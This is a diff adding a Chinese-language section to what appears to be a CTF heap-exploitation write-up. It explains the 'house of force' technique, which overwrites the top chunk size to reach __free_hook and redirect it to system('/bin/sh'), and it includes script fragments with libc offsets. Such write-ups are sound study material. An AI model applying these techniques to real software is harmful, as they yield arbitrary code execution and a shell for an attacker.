@@ -138,7 +138,36 @@ new出来搞定,效果图同3.1/3.2<br>
   delete(2)
   new(2,0x68,'A'*19+p64(0xdeedbeef))
 ```
-### 3.4.house of force。修改top chunk size,通过malloc 将top chunk size向高地址推进，使用free_hook
+### 3.4.house of force。修改top chunk size,通过malloc 将top chunk size推向高地址free_hook
+从第三种方式可以知道可以控制top chunk的size，这样可以通过将top chunk的size修改的很大<br>
+在malloc(big_size)的时候不会崩溃<br>
+使得top chunk size刚好覆盖到free_hook，切top chunk size的值刚好为system_addr<br>
+所以top chunk size的大小应该为`(free_hook的地址 - 当前top chunk 的地址) + system_addr`<br>
+Q：为什么不用one_gadget?为什么不用malloc_hook?<br>
+由于top chunk size大小的地位是8字节对齐的，只可能为xxx1或者xxx9<br>
+这样跳转one_gadget的地址存在一定的偏移，在xxx1或xxx9的时候，不能成功getshell<br>
+这也是不能使用malloc_hook的原因，没有办法使用one_gadget。<br>
+之所以使用free_hook，是因为在free(chunkx)时,调用free_hook的时候，会将chunkx的data段作为free_hook的参数<br>
+即free_hook(chunkx) -> system("/bin/sh")<br>
+```
+  main_arena=main_arena-0x58
+  malloc_hook=main_arena-0x10
+
+  #free(chunk)->free_hook(chunk->data)->system(/bin/sh)
+  free_hook=0x7ffff7bcd7a8#libc_base+libc['free_hook']
+  topchunk=heap_addr-0x78+0x900
+
+  #free(chunk)->free_hook()->onegadget
+  #one_gadget not fit
+  offset=free_hook-topchunk-0x10
+  success(hex(offset))
+
+  one_gadget=main_arena-0x3c4b20+0xf1147
+  system_addr=main_arena-0x3c4b20+0x45390
+  success(hex(one_gadget))
+
+```
+
 
 
 
